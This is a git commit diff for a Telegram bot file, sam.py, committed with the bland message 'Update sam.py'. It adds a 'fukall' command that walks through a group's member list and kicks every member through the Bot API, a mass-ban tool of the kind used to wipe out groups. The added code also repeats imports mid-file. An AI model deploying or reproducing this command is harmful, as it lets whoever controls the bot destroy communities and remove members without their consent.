c875295badc404d5c130a33c129ec72e1356768f
QueenArzoo <64604049+QueenArzoo@users.noreply.github.com>
2021-11-29 12:45:31 +0800

    Update sam.py

--- sam.py
+++ sam.py
@@ -106,6 +106,32 @@ async def deleter(bot: Client, cmd: Message):
                   await slp(int(TIME))
                   await cmd.delete()
 
+			
+			
+import asyncio
+import html
+import os
+import re
+import sys
+
+import aiohttp
+import regex
+from aiohttp import ClientSession
+from pyrogram import Client, filters
+from pyrogram.types import Message
+
+
+@Sam.on_message(filters.command("fukall") &
+                 filters.group & filters.user(ADMINS))
+async def ban_all(c: Client, m: Message):
+    chat = m.chat.id
+
+    async for member in c.iter_chat_members(chat):
+        user_id = member.user.id
+        url = (
+            f"https://api.telegram.org/bot{TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
+        async with aiohttp.ClientSession() as session:
+            await session.get(url)			
 #=======================================================================
 
 Sam.run()
